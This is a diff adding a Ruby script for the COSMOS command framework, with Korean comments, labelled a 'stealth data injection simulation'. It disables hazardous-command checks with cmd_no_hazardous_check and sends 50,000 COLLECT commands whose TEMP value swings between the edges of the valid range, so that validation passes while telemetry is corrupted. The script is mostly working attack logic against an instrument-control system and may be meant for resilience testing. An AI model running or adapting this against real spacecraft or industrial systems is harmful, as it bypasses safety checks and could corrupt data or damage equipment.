@@ -1,0 +1,25 @@
+require 'cosmos/script'
+
+puts "Starting Stealth Data Injection Simulation (50,000 parameter manipulations)..."
+
+# 위험 경고 무시!
+cmd_no_hazardous_check("INST", "CLEAR")
+
+50000.times do |i|
+  # [공격 로직: Validation(0~25) 우회형 마이크로 인젝션]
+  # 정상적인 온도는 천천히 변하지만, 공격자는 
+  # 합법적인 범위의 양극단(0.01과 24.99)을 1초에 수십 번씩 오가며 시스템을 교란시킵니다.
+  anomalous_temp = (i % 2 == 0) ? 24.9999 : 0.0001
+
+  begin
+    # 범위 제한에 걸리지 않고 무사히 발사됨!
+    cmd_no_hazardous_check("INST", "COLLECT", "TYPE" => 'NORMAL', "DURATION" => 1.0, "OPCODE" => 1, "TEMP" => anomalous_temp)
+    
+  rescue => e
+    puts "Injection failed at iteration #{i}: #{e}"
+  end
+
+  wait(0.05)
+end
+
+puts "Data Injection Attack Complete. Telemetry is now corrupted with micro-oscillations."
